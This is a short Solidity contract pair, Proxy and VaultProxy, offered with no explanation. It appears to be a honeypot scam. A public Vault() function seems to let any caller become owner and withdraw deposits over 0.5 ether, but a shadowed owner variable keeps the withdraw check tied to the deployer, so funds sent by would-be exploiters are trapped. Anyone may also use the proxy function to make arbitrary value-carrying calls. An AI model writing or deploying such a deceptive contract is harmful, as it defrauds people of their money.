pragma solidity ^0.4.24;

contract Proxy {
    modifier onlyOwner { if (msg.sender == O[0]) _; } 
    address[1] O = [msg.sender];
    function transferOwner(address _owner) public onlyOwner { O[0] = _owner; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    mapping (address => uint256) public Deposits;
    address private O;
    
    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            O = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount > 0 && Deposits[msg.sender] >= amount) {
            msg.sender.transfer(amount);
        }
    }
}